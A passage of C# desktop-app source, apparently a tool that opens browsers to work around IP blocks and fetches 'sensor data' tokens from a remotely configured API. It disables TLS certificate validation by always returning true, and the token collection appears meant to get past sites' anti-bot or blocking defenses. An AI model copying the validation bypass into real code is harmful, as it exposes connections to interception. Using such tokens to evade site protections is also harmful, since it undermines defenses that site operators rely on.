                string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
                string caption = "Express";
                if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
                {
                    await StartbraveAndConnect();
                }
            }
            else
            {
                await StartbraveAndConnect();
            }
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private async void button5_Click(object sender, EventArgs e)
        {
            operapath = "Check_IP_Block_opera";
            if (File.Exists(operapath))
            {
                Form owner = new Form
                {
                    TopMost = true
                };
                string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
                string caption = "Express";
                if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
                {
                    await StartOperaAndConnect();
                }
            }
            else
            {
                await StartOperaAndConnect();
            }
        }
        private string getLink()
        {
            string text3 = "";
            string text = "";
            string text2 = "https://raw.githubusercontent.com/bytenova-dot/masterdata/refs/heads/main/getlinkapktoken";
            string requestUriString = text2;
            while (true)
            {
                try
                {
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
                    httpWebRequest.ServerCertificateValidationCallback = CertificateValidation;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    string method = "GET";
                    httpWebRequest.Method = method;
                    httpWebRequest.Timeout = 65000;
                    httpWebRequest.ReadWriteTimeout = 65000;
                    using StreamReader streamReader = new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
                    text3 = streamReader.ReadToEnd().Trim();
                    if (string.IsNullOrEmpty(text3))
                    {
                        text3 = "https://novabyte.in/Api/sensor";
                    }
                    return text3;
                }
                catch (Exception ex)
                {
                }
                return "https://novabyte.in/Api/sensor";
            }
        }

        private bool CertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true; ;
        }

        private string ReadOTP()
        {
            string empty = string.Empty;
            string text = string.Empty;
            string text2 = getLink();
            string requestUriString = text2;
            string[] array = new string[5];
            string text3 = "{\"userId\":\"";
            array[0] = text3;
            array[1] = Program.clientID;
            string text4 = "\", \"LastChar\":\"";
            array[2] = text4;
            string text5 = "0";
            array[3] = text5;
            string text6 = "\"}";
            array[4] = text6;
            string text7 = string.Concat(array);
            while (true)
            {
                try
                {
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    string contentType = "application/json";
                    httpWebRequest.ContentType = contentType;
                    string method = "POST";
                    httpWebRequest.Method = method;
                    httpWebRequest.Timeout = 10000;
                    httpWebRequest.ReadWriteTimeout = 10000;
                    using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                    {
                        string value = text7;
                        streamWriter.Write(value);
                    }
                    using StreamReader streamReader = new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
                    empty = streamReader.ReadToEnd();
                    string text8 = empty;
                    string value2 = "6,a,";
                    if (text8.Contains(value2))
                    {
                        text = empty;
                        ProcessAndSaveSensorData(text);
                    }
                    Refreshtoken();
                }
                catch (WebException ex)
                {
                    Application.DoEvents();
                    Thread.Sleep(500);
                    continue;
                }
                break;
            }
            return text;
        }
        private void ProcessAndSaveSensorData(string rawApiResponse)
        {
            try
            {
                List<string> list = JsonConvert.DeserializeObject<List<string>>(rawApiResponse);
                if (list == null || list.Count == 0)
                {
                    return;
                }
                List<string> list2 = new List<string>();
                if (File.Exists(jsonFilePath))
                {
                    list2 = JsonConvert.DeserializeObject<List<string>>(File.ReadAllText(jsonFilePath)) ?? new List<string>();
                }
                bool flag = false;
                foreach (string item in list)
                {
                    string value = "6,a,";
                    if (item.StartsWith(value) && !list2.Contains(item))
                    {
                        list2.Add(item);
                        flag = true;
                        string value2 = "New Sensor Data Found and Added.";
                        Console.WriteLine(value2);
                    }
                }
                if (flag)
                {
                    string contents = JsonConvert.SerializeObject(list2, Formatting.Indented);
                    File.WriteAllText(jsonFilePath, contents);
                }
                else
                {
                    string value3 = "No new unique data to add.";
                    Console.WriteLine(value3);
                }
            }
            catch (Exception ex)
            {
                string text = "Error processing data: ";
                Console.WriteLine(text + ex.ToString());
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            ReadOTP();
            Refreshtoken();
        }
        private void Refreshtoken_old()
        {
            string text = "SensorList.json";
            string path = text;
            string result = string.Empty;
            try
            {
                if (!File.Exists(path))
                {
                    string value = "File nahi mili!";
                    Console.WriteLine(value);
                }
                List<string> list = JsonConvert.DeserializeObject<List<string>>(File.ReadAllText(path)) ?? new List<string>();
                if (list.Count <= 0)
                {
                    string value2 = "JSON file khali hai!";
                    Console.WriteLine(value2);
                }
                label7.Text = "Token Count :-  " + list.Count.ToString();
            }
            catch { }
        }
        private void Refreshtoken()
        {
            string path = "SensorList.json";

            try
            {
                if (!File.Exists(path))
                {
                    Console.WriteLine("File nahi mili!");
                    return;
                }
                DateTime createTime = File.GetCreationTime(path);
                if (DateTime.Now > createTime.AddHours(4))
                {
                    File.Delete(path);

                    Console.WriteLine("SensorList.json 4 hour purani thi, delete kar di gayi.");
                    label7.Text = "Token Count :- 0";
                    return;
                }
                List<string> list = JsonConvert.DeserializeObject<List<string>>(
                    File.ReadAllText(path)
                ) ?? new List<string>();

                if (list.Count <= 0)
                {
                    Console.WriteLine("JSON file khali hai!");
                }

                label7.Text = "Token Count :- " + list.Count.ToString();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        private void Form2_Load(object sender, EventArgs e)
        {
            string plainText = "https://gofile.io/d/ipP6xD";
            QRCodeGenerator qRCodeGenerator = new QRCodeGenerator();
            QRCodeData data = qRCodeGenerator.CreateQrCode(plainText, QRCodeGenerator.ECCLevel.Q);
            Base64QRCode base64QRCode = new Base64QRCode(data);
            string graphic = base64QRCode.GetGraphic(20);
            pictureBox2.Image = LoadImage(graphic);
            Refreshtoken();
        }
        public Image LoadImage(string strin_1)
        {
            byte[] buffer = Convert.FromBase64String(strin_1);
            using MemoryStream stream = new MemoryStream(buffer);
            return Image.FromStream(stream);
        }
        private async void button7_Click(object sender, EventArgs e)
        {
            cometpath = "Check_IP_Block_edge";
            if (File.Exists(edgepath))
            {
                Form owner = new Form
                {
                    TopMost = true
                };
                string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
                string caption = "Express";
                if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
                {
                    await StartCometAndConnect();
                }
            }
            else
            {
                await StartCometAndConnect();
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
